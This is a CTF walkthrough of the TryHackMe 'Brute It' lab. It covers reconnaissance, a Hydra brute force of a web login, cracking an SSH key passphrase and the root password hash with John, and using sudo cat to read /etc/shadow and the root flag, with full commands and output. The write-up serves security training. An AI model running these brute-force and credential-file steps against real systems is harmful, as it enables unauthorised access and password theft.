---
layout: single
title: "Brute It"
link: "https://tryhackme.com/room/bruteit"
parent: TryHackMe
os: Linux
difficulty: Easy
tags: [Nmap, Hydra, John]
starred: false
date: 2026-02-06
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
### Nmap Scan
Let's find out what services are running on the victim machine using `nmap`:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for <Machine-IP>
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The answers to the first section are already in our nmap result. We have `ssh` on port `22` and the `apache http server` on `80`.
### Directory Enumeration
Let's see what directories are located on the server using `feroxbuster`:
```bash
❯ feroxbuster -u http://<Machine-IP> -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>/
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[...] - 17s    20469/20469   1171/s  http://<Machine-IP>/
[...] - 14s    20469/20469   1478/s  http://<Machine-IP>/admin/
[...] - 12s    20469/20469   1712/s  http://<Machine-IP>/admin/panel/
```
So the question about the hidden directory is `/admin`.

### Login Page
By going to the directory we found on `/admin`, we can see that in `Inspect element` there is a text saying: `Hey john, if you do not remember, the username is admin`.

So we have both `admin` and `john` as suspect users. We should keep that in mind.

## 2. Initial Access
In order to find the password for user `admin` we can use `Hydra`.

### Login Brute Force
Using `Hydra` to brute force this login page, we need to gather some information. Let's break down what Hydra needs from us in a simple list:
* 1. Looking into the Network tab we see that the admin page is using `POST` method.
* 2. In the body of the admin page `Inspect Element`, we can see that the login forms are:
    * `<input type="text" name="user">`
    * `<input type="password" name="pass">`
    * So the name of the inputs are `user` and `pass`.
* 3. When we put a wrong password we get the error: `Username or password invalid`

Now that we have the information, we can fill out the `hydra` command below with them:
```bash
❯ hydra -l <Username> -P <Wordlist> <Machine-IP> <http method> "/admin/:<user input name>=^USER^&<password input name>=^PASS^:F=<Invalid input message/Error>"
```
Now let's use this information to bruteforce:
```bash
❯ hydra -l admin -P kali-wordlists/rockyou.txt <Machine-IP> http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-06 12:05:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://<Machine-IP>:80/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid
[80][http-post-form] host: <Machine-IP>   login: admin   password: xavier
```
So the password for user `admin` is `xavier`.

After successful login, the page will show:
```bash
Hello john, finish the development of the site, here's your RSA private key.

THM{brut3_f0rce_is_e4sy}
```
That's one of the flags we needed.
Next we will download the RSA Key for user flag.

## 3. User Flag
First of all we need to save the `RSA Key` into a file on the page. Let's name it `id_rsa` then using a tool named `ssh2john` we need to extract the hash of the key:
```bash
❯ ssh2john.py id_rsa > id_rsa.hash
```
This hash can be cracked using `John`.
Let's use the `rockyou.txt` dictionary to find the password included in this key:
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)
1g 0:00:00:00 DONE (2026-02-06 12:21) 50.00g/s 3635Kp/s 3635Kc/s 3635KC/s saloni..pooppy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
So the next answer we found is the password: `rockinroll`.

* **Important:** To avoid the `Load key "id_rsa": bad permissions` error we should give the key the right permissions, we can use this command: `❯ sudo chmod 600 id_rsa`.

We can now use the key to `SSH`:
```bash
❯ ssh -i id_rsa john@<Machine-IP>
Enter passphrase for key 'id_rsa': rockinroll
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ whoami
john
```
After a successful login, we can now look for the `user.txt` in home directory:
```bash
john@bruteit:~$ cat user.txt
THM{a_password_is_not_a_barrier}
```
Next we need to get root permission.

## 4. Priviledge Escalation
First things first, we can start by `sudo -l` which checks for `SUID Binaries` that can be used by our user. We can see that we have `cat` as `SUID` exploit:
```bash
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
As it says, user `john` can run `cat` command.

* What are we looking for? Passwords!
* Where are passwords stored on Linux? /etc/shadow

So let's try reading the shadow file and see what we have:
```bash
john@bruteit:~$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
. . .
```
The text in front of `root:` is the `encrypted password` of `root` which is and we can save it to a file using `echo` command:
```bash
❯ echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::' > hash.txt
```
Now we should decrypt it! We can use `hashcat` or `john` for this purpose. I will use `john` as as following:
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)
```
So the password for root is `football`.

## 5. Root Flag
For the root flag we can either `login as root` or try using `cat` as user `john` and read the flag. 

We can simply use the command below just like what we had with `/etc/shadow`:
```bash
john@bruteit:~$ sudo cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
That was the last flag! We used the same `SUID` exploitation to read it.

Good Luck!


---

{% comment %}

[Technique]: Web Form Brute Force
[Command]: hydra -l admin -P rockyou.txt <IP> http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
[Why]: Cracks the web login form when a username is known but the password is not.

[Technique]: Hash Cracking (John)
[Command]: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
[Why]: Cracks the SHA-512 crypt hash found in the /etc/shadow file.

[Technique]: Sudo Privilege Check
[Command]: sudo -l
[Why]: Confirmed the user could run 'cat' as root without a password.

{% endcomment %}
